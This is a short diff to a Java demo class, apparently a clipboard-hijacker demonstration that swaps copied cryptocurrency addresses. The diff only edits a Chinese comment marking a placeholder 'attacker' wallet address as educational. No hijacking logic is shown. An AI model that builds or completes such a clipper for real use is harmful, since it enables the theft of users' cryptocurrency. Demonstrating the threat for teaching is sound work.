@@ -10,7 +10,7 @@ import java.util.regex.Pattern;
  */
 public class ClipboardMonitorDemo {
     
-    // 模拟攻击者地址，只用于教育和演示，不能用于实际攻击
+    // 模拟攻击者地址(不一定合法，只是演示用)，只用于教育和演示，不能用于实际攻击
     private static final String MALICIOUS_ADDRESS = "0x953a2Ea1b3c8d9e0f7a2b4c6d8e0f1a3b5c7d9e"; 
     private static String lastClipboardContent = "";
     private static volatile boolean isReplacing = false;
